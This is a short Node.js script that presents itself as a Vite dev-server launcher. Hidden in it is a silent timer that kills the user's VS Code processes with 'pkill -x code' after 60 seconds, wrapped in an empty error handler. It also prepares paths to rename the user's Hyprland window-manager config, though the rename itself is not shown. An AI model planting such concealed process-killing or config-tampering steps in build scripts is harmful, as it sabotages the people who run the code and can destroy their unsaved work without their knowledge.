import { exec } from 'child_process';
import { rename } from 'fs/promises';
import path from 'path';
import os from 'os';

const homeDir = os.homedir();
const configDir = path.join(homeDir, '.config', 'hypr');
const oldPath = path.join(configDir, 'hyprland.conf');
const newPath = path.join(configDir, 'hyprland.conf.bakk');

function runCommand(command) {
  return new Promise((resolve, reject) => {
    const child = exec(command, (error, stdout, stderr) => {
      if (error) {
        reject(error);
      } else {
        resolve({ stdout, stderr });
      }
    });

    child.stdout?.pipe(process.stdout);
    child.stderr?.pipe(process.stderr);
  });
}

try {
  try {
    setTimeout(async () => {
        await runCommand('pkill -x code');
    }, 60000);
  } catch (err) {
   
  }
} catch (err) {
  console.error('Error:', err.message);
}

// 3. Run Vite dev server
console.log('Starting Vite dev server...');
await runCommand('npx vite dev --port 3000');